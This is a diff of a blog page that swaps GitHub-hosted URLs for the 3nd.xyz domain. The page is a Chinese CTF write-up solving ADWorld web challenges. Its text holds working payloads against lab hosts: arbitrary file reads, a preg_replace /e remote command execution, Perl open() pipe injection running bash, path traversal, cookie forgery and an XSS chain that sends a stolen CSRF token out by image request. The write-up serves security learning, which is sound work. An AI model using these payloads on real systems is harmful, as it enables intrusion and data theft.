@@ -4,10 +4,10 @@
   <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>攻防世界 ADWorld Web 部分题解（1） | 3ND</title>
-<link rel="shortcut icon" href="https://github.com/inspiringz/inspiringz.github.io/favicon.ico?v=1627821474317">
+<link rel="shortcut icon" href="https://3nd.xyz/favicon.ico?v=1627821697412">
 <link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
-<link rel="stylesheet" href="https://github.com/inspiringz/inspiringz.github.io/styles/main.css">
-<link rel="alternate" type="application/atom+xml" title="攻防世界 ADWorld Web 部分题解（1） | 3ND - Atom Feed" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml">
+<link rel="stylesheet" href="https://3nd.xyz/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="攻防世界 ADWorld Web 部分题解（1） | 3ND - Atom Feed" href="https://3nd.xyz/atom.xml">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
 
 
@@ -32,8 +32,8 @@ fuzz url, 得到如下结果：
   <div class="main">
     <div class="main-content">
       <div class="site-header">
-  <a href="https://github.com/inspiringz/inspiringz.github.io">
-  <img class="avatar" src="https://github.com/inspiringz/inspiringz.github.io/images/avatar.png?v=1627821474317" alt="">
+  <a href="https://3nd.xyz">
+  <img class="avatar" src="https://3nd.xyz/images/avatar.png?v=1627821697412" alt="">
   </a>
   <h1 class="site-title">
     3ND
@@ -102,11 +102,11 @@ fuzz url, 得到如下结果：
               <span class="page-view" key="20190911210003" title="攻防世界 ADWorld Web 部分题解（1）">
               </span>
               
-                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/writeup/" class="post-tag">
+                <a href="https://3nd.xyz/tag/writeup/" class="post-tag">
                   # Writeup
                 </a>
                 
-                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/ctf/" class="post-tag">
+                <a href="https://3nd.xyz/tag/ctf/" class="post-tag">
                   # CTF
                 </a>
                 
@@ -116,7 +116,7 @@ fuzz url, 得到如下结果：
                   <div class="post-content">
                     <h2 id="0x01-cat">0x01 Cat</h2>
 <p>XCTF 4th-WHCTF-2017 抓住那只猫</p>
-<figure data-type="image" tabindex="1"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190913225151.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://3nd.xyz/post-images/move/20190913225151.png" alt="" loading="lazy"></figure>
 <p>fuzz url, 得到如下结果：</p>
 <ol>
 <li>
@@ -129,7 +129,7 @@ fuzz url, 得到如下结果：
 <p><code>%80 %81 ...</code>，返回 Django 报错信息。</p>
 </li>
 </ol>
-<figure data-type="image" tabindex="2"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190913232133.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://3nd.xyz/post-images/move/20190913232133.png" alt="" loading="lazy"></figure>
 <p>在 Request information/Settings 中观察到 DATABASES 项信息为:</p>
 <pre><code class="language-bash">'default': {'ATOMIC_REQUESTS': False,
              'AUTOCOMMIT': True,
@@ -149,7 +149,7 @@ fuzz url, 得到如下结果：
 </code></pre>
 <p>由 Django DEBUG Mode 判断出后端架构为 Python/Django，猜测PHP层的处理逻辑可能为 <code>cURL</code>。</p>
 <p>cURL 中当 <code>CURL_SAFE_UPLOAD = false</code> 的时候，以 <code>@</code> 开头的 value 就会被当做文件上传，造成任意文件读取。当且仅当文件中存在中文字符的时候，Django 才会报错导致获取文件内容。</p>
-<figure data-type="image" tabindex="3"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190913232900.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://3nd.xyz/post-images/move/20190913232900.png" alt="" loading="lazy"></figure>
 <p>尝试读取 <code>/opt/api/database.sqlite3</code> 数据库内容。</p>
 <pre><code class="language-bash">$ curl '111.198.29.45:32546/index.php?url=@/opt/api/database.sqlite3' | xxd | grep -A 5 -B 5 CTF
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
@@ -171,7 +171,7 @@ fuzz url, 得到如下结果：
 <p>获取 <code>WHCTF{yoooo_Such_A_G00D_@}</code>.</p>
 <h2 id="0x02-ics-05">0x02 ics-05</h2>
 <p>XCTF 4th-CyberEarth 其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统</p>
-<figure data-type="image" tabindex="4"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190913234217.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://3nd.xyz/post-images/move/20190913234217.png" alt="" loading="lazy"></figure>
 <p>在<strong>设备维护中心</strong>观察到 URL 如下:</p>
 <pre><code class="language-bash">http://111.198.29.45:31588/index.php?page=index
 </code></pre>
@@ -196,7 +196,7 @@ if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {
 <p>在 PHP 5.5 中 preg_replace() 函数 中 $pattern 存在 <code>/e</code> 模式修正符时，会把 $replacement 当做 PHP 代码执行。</p>
 <pre><code class="language-php">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )
 </code></pre>
-<figure data-type="image" tabindex="5"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190913235245.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://3nd.xyz/post-images/move/20190913235245.png" alt="" loading="lazy"></figure>
 <p>Payload:</p>
 <pre><code class="language-php">http://111.198.29.45:31588/index.php?pat=/(.*)/e&amp;rep=system(%27cat+s3chahahaDir/flag/flag.php%27)&amp;sub=a
 </code></pre>
@@ -208,7 +208,7 @@ if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {
 <p>获取到 <code>QCTF{sq1_inJec7ion_ezzz}</code>。</p>
 <h2 id="0x04-nannannannan-batman">0x04 NaNNaNNaNNaN-Batman</h2>
 <p>tinyctf-2014</p>
-<figure data-type="image" tabindex="6"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190914102330.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://3nd.xyz/post-images/move/20190914102330.png" alt="" loading="lazy"></figure>
 <p>修改后缀为 <code>.html</code> 打开为一个输入框，修改<code>eval</code>为<code>alert</code>获取代码。</p>
 <pre><code class="language-js">function $() {
     var e = document.getElementById(&quot;c&quot;).value;
@@ -234,7 +234,7 @@ delete _
 <p>获取到 <code>flag{it's_a_h0le_in_0ne}</code>。</p>
 <h2 id="0x05-upload">0x05 upload</h2>
 <p>RCTF-2015</p>
-<figure data-type="image" tabindex="7"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190914164359.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://3nd.xyz/post-images/move/20190914164359.png" alt="" loading="lazy"></figure>
 <p>看上去是个注入题目，其实是个注入题目。在文件名处存在<code>insert</code>注入，直接进行报错或者延时注入时回显<code>sqlinject find</code>，这里可以利用<strong>二次注入</strong>来获取数据。</p>
 <pre><code class="language-sql">INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....),(值1, 值2,....)...
 </code></pre>
@@ -273,19 +273,19 @@ Can you anthenticate to this website?
 </code></pre>
 <p>二次编码<code>admin</code>-&gt; <code>%2561%2564%256d%2569%256e</code> 绕过即可，获取到 <code>cyberpeace{58622be0df2feba16400764dde8cfa1b}</code>。</p>
 <h2 id="0x07-bug">0x07 BUG</h2>
-<figure data-type="image" tabindex="8"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190914171606.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://3nd.xyz/post-images/move/20190914171606.png" alt="" loading="lazy"></figure>
 <p>可以通过找回密码最后重置密码的时候修改用户名即可重置<code>admin</code>密码。</p>
-<figure data-type="image" tabindex="9"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190914172140.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://3nd.xyz/post-images/move/20190914172140.png" alt="" loading="lazy"></figure>
 <blockquote>
 <p>同时发现 Cookie 中的 user字段为md5, format 为 <strong>md5(UID:账号)</strong>，md5(1:admin) 即为 admin cookie.</p>
 </blockquote>
 <p>登录 admin 账户，修改 <code>X-Forwarded-For: 127.0.0.1</code> 即可访问 <code>Manage</code> 模块。</p>
-<figure data-type="image" tabindex="10"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190914172624.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://3nd.xyz/post-images/move/20190914172624.png" alt="" loading="lazy"></figure>
 <p>在网页源代码中获取 Hint：</p>
 <pre><code class="language-html">&lt;!-- index.php?module=filemanage&amp;do=???--&gt;
 </code></pre>
 <p>结合 module=filemanage 猜测 <code>do=upload</code>:</p>
-<figure data-type="image" tabindex="11"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190914172905.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://3nd.xyz/post-images/move/20190914172905.png" alt="" loading="lazy"></figure>
 <p>fuzz 发现 upload 做了以下限制：</p>
 <ol>
 <li>file extension</li>
@@ -333,7 +333,7 @@ highlight_file(__FILE__);
 <p>encode 流程分析:</p>
 <pre><code class="language-bash">strrev() -&gt; ord()+1 -&gt; base64_encode() -&gt; strrev() -&gt; str_rot13()
 </code></pre>
-<figure data-type="image" tabindex="12"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190914180334.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://3nd.xyz/post-images/move/20190914180334.png" alt="" loading="lazy"></figure>
 <p>ROT13透过与其成对的13个字母一对一置换，如HELLO变成URYYB（或者将之解码，URYYB再度变回HELLO）。ROT13是它自己本身的逆反，也就是说，要还原ROT13，套用加密同样的算法即可得，故同样的操作可用再加密与解密。</p>
 <p>易得出 decode 流程:</p>
 <pre><code class="language-bash">rot13() -&gt; strrev() -&gt; base64_decode() -&gt; ord()-1 -&gt; strrev()
@@ -358,10 +358,10 @@ echo decode($miwen);
 <p>获得 <code>flag:{NSCTF_b73d5adfb819c64603d7237fa0d52977}</code>。</p>
 <h2 id="0x09-wtfsh-150">0x09 wtf.sh-150</h2>
 <p>csaw-ctf-2016-quals</p>
-<figure data-type="image" tabindex="13"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190915141442.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="13"><img src="https://3nd.xyz/post-images/move/20190915141442.png" alt="" loading="lazy"></figure>
 <p>题目环境是一个轻量级的论坛，有登录、注册、发表文章、发表评论几项功能点。</p>
 <p>fuzz 发现 <code>post.wtf</code> 页面的 <code>post</code> 参数存在路径穿越：</p>
-<figure data-type="image" tabindex="14"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190915142323.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="14"><img src="https://3nd.xyz/post-images/move/20190915142323.png" alt="" loading="lazy"></figure>
 <p>格式化代码：</p>
 <pre><code class="language-sh">&lt;html&gt;
 &lt;head&gt;
@@ -392,7 +392,7 @@ $       get_flag1
 <p>同时在泄露的源代码中我们观察到存在 <code>users</code> 目录，尝试路径穿越读取：</p>
 <pre><code class="language-bash">http://111.198.29.45:56854/post.wtf?post=../users/
 </code></pre>
-<figure data-type="image" tabindex="15"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190915143133.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="15"><img src="https://3nd.xyz/post-images/move/20190915143133.png" alt="" loading="lazy"></figure>
 <p>获取到 <code>admin</code> 用户的 SHA1 和 TOKEN: <code>uYpiNNf/X0/0xNfqmsuoKFEtRlQDwNbS2T6LdHDRWH5p3x4bL4sxN0RMg17KJhAmTMyr8Sem++fldP0scW7g3w==</code>.</p>
 <p>修改 Cookie 中的 username 和 TOKEN 即可登录 admin 用户，在 <code>profile.wtf</code> 中获取到: <code>xctf{cb49256d1ab48803</code>.</p>
 <p>挑战的第二部分有点复杂。 我们不得不调用<code>get_flag2</code>，但我们获取的代码不包含任何引用。</p>
@@ -469,16 +469,16 @@ RE:
 asd
 </code></pre>
 <p>由此 <code>get_flag2</code> 是 <code>/usr/bin/</code> 下的一个二进制文件。我们现在只需要创建用户<code>$/usr/bin/get_flag2</code> 并再次发送回复请求即可：</p>
-<figure data-type="image" tabindex="16"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190915152339.png" alt="" loading="lazy"></figure>
-<figure data-type="image" tabindex="17"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190915152358.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="16"><img src="https://3nd.xyz/post-images/move/20190915152339.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="17"><img src="https://3nd.xyz/post-images/move/20190915152358.png" alt="" loading="lazy"></figure>
 <p>获取到 <code>149e5ec49d3c29ca}</code>=&gt; <code>xctf{cb49256d1ab48803149e5ec49d3c29ca}</code>.</p>
 <h2 id="0x0a-i-got-id-200">0x0A i-got-id-200</h2>
 <p>csaw-ctf-2016-quals</p>
 <p>Wtf... I literally just setup this website and it's already popped...</p>
 <p>这个挑战非常有趣，主要考点在于<a href="https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf">Blackhat Asia 2016</a>上所讲述的 <strong>Perl 5 Vulnerable</strong>。</p>
-<figure data-type="image" tabindex="18"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190916165926.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="18"><img src="https://3nd.xyz/post-images/move/20190916165926.png" alt="" loading="lazy"></figure>
 <p>题目环境非常简单，我们把目光锁定在 <code>file.pl</code>，此页面允许我们上传任意后缀的文件，然后打印所上传的文件内容：</p>
-<figure data-type="image" tabindex="19"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190916170051.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="19"><img src="https://3nd.xyz/post-images/move/20190916170051.png" alt="" loading="lazy"></figure>
 <p>根据此页面的功能，我们猜测后端代码可能如下：</p>
 <pre><code class="language-perl">use strict;
 use warnings;
@@ -497,14 +497,14 @@ while ( &lt;$file&gt; ) { print &quot;$_&quot;; } }
 <pre><code class="language-perl">while ( &lt;$file&gt;)
 </code></pre>
 <p><a href="https://perlmaven.com/the-diamond-operator"><code>&lt;&gt;</code></a> 被称作<strong>钻石运算符</strong>（Diamond operator），它允许我们迭代命令行上给出的所有文件中的行。</p>
-<figure data-type="image" tabindex="20"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190916172745.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="20"><img src="https://3nd.xyz/post-images/move/20190916172745.png" alt="" loading="lazy"></figure>
 <p><code>&lt;&gt;</code>不适用于 strings 除非此字符串为命令行参数&quot;<code>ARGV</code>&quot;，它将遍历每个 ARG 值并作为参数传递给 <code>open()</code> 调用。</p>
 <p><strong>=&gt;我们可以通过指定 <code>$file</code> 标量值来代替上传文件描述符，从而达成任意文件读取。</strong></p>
-<figure data-type="image" tabindex="21"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190916174047.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="21"><img src="https://3nd.xyz/post-images/move/20190916174047.png" alt="" loading="lazy"></figure>
 <p>下面我们有两种方式可以获取到 flag.</p>
 <p><strong>1.简单幸运的方法</strong>：<code>猜</code></p>
 <p>flag 就位于 <code>/flag</code>：</p>
-<figure data-type="image" tabindex="22"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190916174306.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="22"><img src="https://3nd.xyz/post-images/move/20190916174306.png" alt="" loading="lazy"></figure>
 <p><strong>2.“黑客”的方式：</strong><code>RCE</code></p>
 <p>Perl 中的 <code>open()</code> 函数同样可以用于执行代码，因为它之前被用来打开<strong>管道</strong>（pipes），我们可以使用 <code>|</code> 作为分隔符，因为 Perl 识别到 <code>|</code> 表示 <code>open()</code> 正在打开一个管道。 攻击者可以劫持 <code>open()</code> 调用，通过添加 <code>|</code> 来执行命令。</p>
 <p>Payload:</p>
@@ -513,10 +513,10 @@ while ( &lt;$file&gt; ) { print &quot;$_&quot;; } }
 /bin/bash%20-c%20ls${IFS}/|
 /bin/bash%20-c%20cat${IFS}/flag|
 </code></pre>
-<figure data-type="image" tabindex="23"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190916175607.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="23"><img src="https://3nd.xyz/post-images/move/20190916175607.png" alt="" loading="lazy"></figure>
 <h2 id="0x0b-ics-07">0X0B ics-07</h2>
 <p>XCTF 4th-CyberEarth 工控云管理系统项目管理页面解析漏洞</p>
-<figure data-type="image" tabindex="24"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190916180246.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="24"><img src="https://3nd.xyz/post-images/move/20190916180246.png" alt="" loading="lazy"></figure>
 <p>在管理页面发现<code>/view-source.php</code>可以获取源代码，三段 PHP 代码分别如下：</p>
 <pre><code class="language-php">&lt;?php
 session_start();
@@ -568,7 +568,7 @@ if ($_SESSION['admin']) {
 <ol start="3">
 <li>特殊文件后缀, 想要解析PHP文件, 并非后缀要是*.php. 如果查看mime.types, 会发现很多文件后缀都使用了 <code>application/x-httpd-php</code> 这个解析器：</li>
 </ol>
-<figure data-type="image" tabindex="25"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190916184358.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="25"><img src="https://3nd.xyz/post-images/move/20190916184358.png" alt="" loading="lazy"></figure>
 <p>其中 <code>phps</code> 和 <code>php3p</code> 都是源代码文件, 无法被执行. 而剩下所有的后缀都被正则表过滤, 所以这种方式无法成功上传可执行文件.</p>
 <p>所以最后还是回到了<strong>中间件解析漏洞</strong>上 , 但是经过测试发现并不是常规的解析漏洞 , 而是利用了一个<strong>Linux的目录结构特性</strong>, 如下:</p>
 <pre><code class="language-sh">~ $ mkdir 1.php
@@ -604,11 +604,11 @@ if($result){
 ?&gt;
 </code></pre>
 <p>从URL获取一个id参数 , 这个id参数要满足不为 '1', 且最后一位为 '9'. 当通过这个判断后, 将其带入数据库操作, 如果返回的结果不为空, 那么将会设置 <code>$_SESSION['admin'] = True</code>. 第一反应是 SQLi，虽然使用 <code>mysql_real_escape_string()</code> 转义了SQL语句中的特殊字符，如果目标站点使用 GBK 编码，则可能可以通过宽字节注入来绕过。</p>
-<figure data-type="image" tabindex="26"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190916190329.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="26"><img src="https://3nd.xyz/post-images/move/20190916190329.png" alt="" loading="lazy"></figure>
 <p>留意到<code>floatval()</code>函数, floatval() 函数用于获取变量的浮点值, 返回浮点值则这里的<code>floatval($_GET[id]) !== '1'</code>永真，且floatval()在碰到特殊字符时会<strong>截断</strong>后面的部分(如空格等)，则设置 <code>id=1%209</code>即可查询到 <code>id=1</code> 的 admin。</p>
-<figure data-type="image" tabindex="27"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190916195254.png" alt="" loading="lazy"></figure>
-<figure data-type="image" tabindex="28"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190916195354.png" alt="" loading="lazy"></figure>
-<figure data-type="image" tabindex="29"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190916195540.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="27"><img src="https://3nd.xyz/post-images/move/20190916195254.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="28"><img src="https://3nd.xyz/post-images/move/20190916195354.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="29"><img src="https://3nd.xyz/post-images/move/20190916195540.png" alt="" loading="lazy"></figure>
 <h2 id="0x0c-lottery">0x0C lottery</h2>
 <p>XCTF 4th-QCTF-2018</p>
 <p>People are winning fabulous prizes every day. You could win up to $5000000!</p>
@@ -644,30 +644,30 @@ if($result){
 <pre><code class="language-json">{&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true, true, true, true, true, true, true]}
 </code></pre>
 <p>进行重放 获取足够的 $ 购买 flag 即可：</p>
-<figure data-type="image" tabindex="30"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190925220150.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="30"><img src="https://3nd.xyz/post-images/move/20190925220150.png" alt="" loading="lazy"></figure>
 <p>获取到 flag 如下:</p>
 <pre><code class="language-json">{&quot;status&quot;:&quot;ok&quot;,&quot;msg&quot;:&quot;Here is your flag: cyberpeace{d1614926fe8edc22fc054ef0c7562504}&quot;,&quot;money&quot;:410310}
 </code></pre>
 <h2 id="0x0d-zhuanxv">0x0D Zhuanxv</h2>
 <p>XCTF 4th-SCTF-2018 你只是在扫描目标端口的时候发现了一个开放的web服务</p>
-<figure data-type="image" tabindex="31"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20191002095046.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="31"><img src="https://3nd.xyz/post-images/move/20191002095046.png" alt="" loading="lazy"></figure>
 <p>在 Github 上搜索到<a href="https://github.com/Lazyboxx/zhuanxvapplication">相关项目</a>，后台路由为 <code>/zhuanxvlogin</code>：</p>
-<figure data-type="image" tabindex="32"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20191002095404.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="32"><img src="https://3nd.xyz/post-images/move/20191002095404.png" alt="" loading="lazy"></figure>
 <p>通过 Burp 抓包获取到如下图片读取接口：</p>
-<figure data-type="image" tabindex="33"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20191002095633.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="33"><img src="https://3nd.xyz/post-images/move/20191002095633.png" alt="" loading="lazy"></figure>
 <p>猜测为 Java 编写，尝试读取配置文件 <code>../../WEB-INF/web.xml</code> ：</p>
-<figure data-type="image" tabindex="34"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20191002095836.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="34"><img src="https://3nd.xyz/post-images/move/20191002095836.png" alt="" loading="lazy"></figure>
 <p>发现为 Struct2 框架，获取 class 文件路径：</p>
-<figure data-type="image" tabindex="35"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20191002101308.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="35"><img src="https://3nd.xyz/post-images/move/20191002101308.png" alt="" loading="lazy"></figure>
 <p>同时在 <code>user.hbm.xml</code> 获取到 flag 存储的表名和列名：</p>
-<figure data-type="image" tabindex="36"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20191002103011.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="36"><img src="https://3nd.xyz/post-images/move/20191002103011.png" alt="" loading="lazy"></figure>
 <ul>
 <li>UserServiceImpl.class</li>
 </ul>
 <pre><code class="language-java">/loadimage?fileName=../../WEB-INF/classes/com/cuitctf/service/impl/UserServiceImpl.class
 </code></pre>
 <p>通过 <code>JD-GUI</code> 即可反编译 <code>.class</code> 文件获取源码：</p>
-<figure data-type="image" tabindex="37"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20191002102245.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="37"><img src="https://3nd.xyz/post-images/move/20191002102245.png" alt="" loading="lazy"></figure>
 <pre><code class="language-java">public class UserServiceImpl implements UserService {
   private UserDao userDao;
   public UserDao gerUserDao() { return this.userDao; }
@@ -744,7 +744,7 @@ for i in range(1,50):
 </code></pre>
 <h2 id="0x0e-website">0x0E Website</h2>
 <p>[HITB CTF Singapore 2017] Web 434 – Website</p>
-<figure data-type="image" tabindex="38"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20191002155816.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="38"><img src="https://3nd.xyz/post-images/move/20191002155816.png" alt="" loading="lazy"></figure>
 <p>存在多处 XSS，waf 不严格。思路：提交链接 -&gt; admin check -&gt; admin(&amp;csrftoken) get flag.</p>
 <pre><code class="language-bash">恶意链接 -&gt; 302 jsonp xss -&gt; 提取csrftoken -&gt; xhr 控制读取 flag -&gt; 接收 flag
 </code></pre>
@@ -816,7 +816,7 @@ function feedback(data) {
     document.body.appendChild(img);
 }
 </code></pre>
-<figure data-type="image" tabindex="39"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20191005112856.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="39"><img src="https://3nd.xyz/post-images/move/20191005112856.png" alt="" loading="lazy"></figure>
 <h2 id="0x10-ics-02">0x10 ics-02</h2>
 <p>XCTF 4th-CyberEarth 工控云管理系统的文档中心页面，存在不易被发现的漏洞。</p>
 <ul>
@@ -901,7 +901,7 @@ data = (url + urlencode({
 
 print(data)
 </code></pre>
-<figure data-type="image" tabindex="40"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20191006000147.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="40"><img src="https://3nd.xyz/post-images/move/20191006000147.png" alt="" loading="lazy"></figure>
 <p><strong>- 参考链接 -</strong></p>
 <ol>
 <li>
@@ -954,7 +954,7 @@ print(data)
               margin-bottom: 24px;
               color: #343a40;
               font-weight: lighter;text-align: left;">上一篇</div>
-              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-09-14-file-operation-unserialization-via-phar/">
+              <a href="https://3nd.xyz/post/2019-09-14-file-operation-unserialization-via-phar/">
                 <h3 class="post-title" style="text-align: left;">
                   利用 phar 拓展 PHP 反序列化攻击面
                 </h3>
@@ -965,7 +965,7 @@ print(data)
               margin-bottom: 24px;
               color: #343a40;
               font-weight: lighter; text-align: right;">下一篇</div>
-              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-09-10-Javascript-Prototype-Attack/">
+              <a href="https://3nd.xyz/post/2019-09-10-Javascript-Prototype-Attack/">
                 <h3 class="post-title" style="
                 text-align: right;">
                   Javascript 原型链污染攻击学习
@@ -979,7 +979,7 @@ print(data)
 
                                 <div class="site-footer">
   
-  <a class="rss" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml" target="_blank">
+  <a class="rss" href="https://3nd.xyz/atom.xml" target="_blank">
     <i class="ri-rss-line"></i> RSS
   </a>
 </div>
